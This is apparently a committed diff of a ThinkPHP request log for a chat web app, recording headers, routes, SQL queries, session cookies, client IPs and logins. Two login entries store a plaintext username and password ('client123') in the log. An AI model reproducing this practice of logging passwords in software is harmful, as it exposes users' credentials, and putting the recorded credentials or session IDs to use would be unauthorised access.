+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\chat\home_page.html [ array (
+  0 => 'client_id',
+  1 => 'client_img',
+  2 => 'client_name',
+  3 => 'clients',
+  4 => 'today_mess',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.013683s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006447s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000713s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000563s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` [ RunTime:0.000649s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000559s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000552s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000532s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000531s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000528s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 56 LIMIT 1 [ RunTime:0.000553s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 56 LIMIT 1 [ RunTime:0.000522s ]
+---------------------------------------------------------------
+[ 2017-07-30T21:22:18+08:00 ] 0.0.0.0 60.181.130.13 POST /home/chat/bind.html
+[ info ] eddchat.oumaikeji.com/home/chat/bind.html [运行时间：0.062997s][吞吐率：15.87req/s] [内存消耗：3,425.97kb] [文件加载：62]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'bind',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '49',
+  'x-original-url' => '/home/chat/bind.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'origin' => 'http://eddchat.oumaikeji.com',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/home/chat/home_page.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=1e5iss2p23a7l159v8jr405f47; CUID=-jqyX',
+  'accept-language' => 'zh-CN,zh;q=0.8,en;q=0.6,ro;q=0.4',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+  'client_id' => '7f0000010fa00000000f',
+  'client_name' => 'client',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->bind[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001006s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006716s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000752s ]
+[ sql ] [ SQL ] SELECT `avatar`,`user_login` FROM `edd_users` WHERE  `user_login` = 'client' [ RunTime:0.000597s ]
+---------------------------------------------------------------
+[ 2017-07-30T22:11:53+08:00 ] 0.0.0.0 140.205.204.75 GET /
+[ info ] eddchat.oumaikeji.com/ [运行时间：0.373577s][吞吐率：2.68req/s] [内存消耗：2,493.65kb] [文件加载：53]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)',
+  'host' => 'eddchat.oumaikeji.com',
+  'accept-language' => 'en',
+  'accept-encoding' => 'gzip,deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\login\home_page.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T22:15:54+08:00 ] 0.0.0.0 14.131.68.208 GET /
+[ info ] eddchat.oumaikeji.com/ [运行时间：0.230451s][吞吐率：4.34req/s] [内存消耗：2,494.91kb] [文件加载：53]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'referer' => 'http://www.topthink.com/topic/26211.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\login\home_page.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T22:15:59+08:00 ] 0.0.0.0 14.131.68.208 GET /favicon.ico
+[ info ] eddchat.oumaikeji.com/favicon.ico [运行时间：0.155973s][吞吐率：6.41req/s] [内存消耗：1,854.89kb] [文件加载：41]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'favicon.ico',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/favicon.ico',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=9kg0kensgrhblduoeonduqhtb1',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'image/webp,image/apng,image/*,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T22:16:07+08:00 ] 0.0.0.0 14.131.68.208 POST /home/login/login_think.html
+[ info ] eddchat.oumaikeji.com/home/login/login_think.html [运行时间：0.300344s][吞吐率：3.33req/s] [内存消耗：3,540.47kb] [文件加载：64]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'login',
+    2 => 'login_think',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '34',
+  'x-original-url' => '/home/login/login_think.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'origin' => 'http://eddchat.oumaikeji.com',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=9kg0kensgrhblduoeonduqhtb1',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'client',
+  'password' => 'client123',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->login_think[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ CACHE ] INIT File
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001961s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.005231s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `user_login` = 'client' LIMIT 1 [ RunTime:0.000778s ]
+[ sql ] [ SQL ] UPDATE `edd_users`  SET `last_login_time`='1501424167',`last_login_ip`='14.131.68.208',`user_hits`=28  WHERE  `id` = 54 [ RunTime:0.000739s ]
+---------------------------------------------------------------
+[ 2017-07-30T22:16:08+08:00 ] 0.0.0.0 14.131.68.208 GET /home/chat/home_page.html
+[ info ] eddchat.oumaikeji.com/home/chat/home_page.html [运行时间：0.401292s][吞吐率：2.49req/s] [内存消耗：3,565.51kb] [文件加载：63]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'home_page',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/home/chat/home_page.html',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=9kg0kensgrhblduoeonduqhtb1; CUID=lvBQV',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\chat\home_page.html [ array (
+  0 => 'client_id',
+  1 => 'client_img',
+  2 => 'client_name',
+  3 => 'clients',
+  4 => 'today_mess',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.008217s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.005433s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000739s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000637s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` [ RunTime:0.001272s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000582s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000729s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000532s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000548s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000549s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 56 LIMIT 1 [ RunTime:0.000529s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 56 LIMIT 1 [ RunTime:0.000502s ]
+---------------------------------------------------------------
+[ 2017-07-30T22:16:10+08:00 ] 0.0.0.0 14.131.68.208 POST /home/chat/bind.html
+[ info ] eddchat.oumaikeji.com/home/chat/bind.html [运行时间：0.229307s][吞吐率：4.36req/s] [内存消耗：3,426.30kb] [文件加载：62]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'bind',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '49',
+  'x-original-url' => '/home/chat/bind.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'origin' => 'http://eddchat.oumaikeji.com',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/home/chat/home_page.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=9kg0kensgrhblduoeonduqhtb1; CUID=tFIWe',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+  'client_id' => '7f0000010fa000000010',
+  'client_name' => 'client',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->bind[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.015953s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.005738s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000714s ]
+[ sql ] [ SQL ] SELECT `avatar`,`user_login` FROM `edd_users` WHERE  `user_login` = 'client' [ RunTime:0.000570s ]
+---------------------------------------------------------------
+[ 2017-07-30T22:16:10+08:00 ] 0.0.0.0 14.131.68.208 GET /home/chat/favicon.png
+[ info ] eddchat.oumaikeji.com/home/chat/favicon.png [运行时间：0.215926s][吞吐率：4.63req/s] [内存消耗：3,454.84kb] [文件加载：63]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'favicon.png',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/home/chat/favicon.png',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/home/chat/home_page.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=9kg0kensgrhblduoeonduqhtb1; CUID=Un-ps',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'image/webp,image/apng,image/*,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.007573s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.005656s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000694s ]
+---------------------------------------------------------------
+[ 2017-07-30T22:33:13+08:00 ] 0.0.0.0 157.55.39.69 GET /robots.txt
+[ info ] eddchat.oumaikeji.com/robots.txt [运行时间：0.159463s][吞吐率：6.27req/s] [内存消耗：1,854.19kb] [文件加载：41]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'robots.txt',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/robots.txt',
+  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
+  'host' => 'eddchat.oumaikeji.com',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'pragma' => 'no-cache',
+  'connection' => 'Keep-Alive',
+  'cache-control' => 'no-cache',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T23:05:37+08:00 ] 0.0.0.0 121.32.33.50 GET /
+[ info ] eddchat.oumaikeji.com/ [运行时间：0.116380s][吞吐率：8.59req/s] [内存消耗：2,494.85kb] [文件加载：53]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'upgrade-insecure-requests' => '1',
+  'dnt' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0',
+  'referer' => 'http://www.topthink.com/topic/26211.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\login\home_page.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T23:05:40+08:00 ] 0.0.0.0 121.32.33.50 GET /favicon.ico
+[ info ] eddchat.oumaikeji.com/favicon.ico [运行时间：0.031793s][吞吐率：31.45req/s] [内存消耗：1,854.80kb] [文件加载：41]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'favicon.ico',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/favicon.ico',
+  'dnt' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=skroidgf3lvtu49msmfq3iufr1',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T23:06:16+08:00 ] 0.0.0.0 121.32.33.50 POST /home/login/login_think.html
+[ info ] eddchat.oumaikeji.com/home/login/login_think.html [运行时间：0.122018s][吞吐率：8.20req/s] [内存消耗：3,540.72kb] [文件加载：64]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'login',
+    2 => 'login_think',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '34',
+  'x-original-url' => '/home/login/login_think.html',
+  'dnt' => '1',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0',
+  'referer' => 'http://eddchat.oumaikeji.com/',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=skroidgf3lvtu49msmfq3iufr1',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'client',
+  'password' => 'client123',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->login_think[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ CACHE ] INIT File
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.002051s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006109s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `user_login` = 'client' LIMIT 1 [ RunTime:0.000769s ]
+[ sql ] [ SQL ] UPDATE `edd_users`  SET `last_login_time`='1501427176',`last_login_ip`='121.32.33.50',`user_hits`=29  WHERE  `id` = 54 [ RunTime:0.000675s ]
+---------------------------------------------------------------
+[ 2017-07-30T23:06:17+08:00 ] 0.0.0.0 121.32.33.50 GET /home/chat/home_page.html
+[ info ] eddchat.oumaikeji.com/home/chat/home_page.html [运行时间：0.214218s][吞吐率：4.67req/s] [内存消耗：3,566.41kb] [文件加载：63]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'home_page',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/home/chat/home_page.html',
+  'upgrade-insecure-requests' => '1',
+  'dnt' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0',
+  'referer' => 'http://eddchat.oumaikeji.com/',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=skroidgf3lvtu49msmfq3iufr1; CUID=Yrsvv',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\chat\home_page.html [ array (
+  0 => 'client_id',
+  1 => 'client_img',
+  2 => 'client_name',
+  3 => 'clients',
+  4 => 'today_mess',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000947s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.005993s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000686s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000570s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` [ RunTime:0.000871s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000588s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000587s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000541s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000534s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000530s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 56 LIMIT 1 [ RunTime:0.000534s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 56 LIMIT 1 [ RunTime:0.000527s ]
+---------------------------------------------------------------
+[ 2017-07-30T23:06:18+08:00 ] 0.0.0.0 121.32.33.50 GET /home/chat/favicon.png
+[ info ] eddchat.oumaikeji.com/home/chat/favicon.png [运行时间：0.064268s][吞吐率：15.56req/s] [内存消耗：3,454.59kb] [文件加载：63]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'favicon.png',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/home/chat/favicon.png',
+  'dnt' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=skroidgf3lvtu49msmfq3iufr1; CUID=1-yqz',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+  'accept-encoding' => 'gzip, deflate',
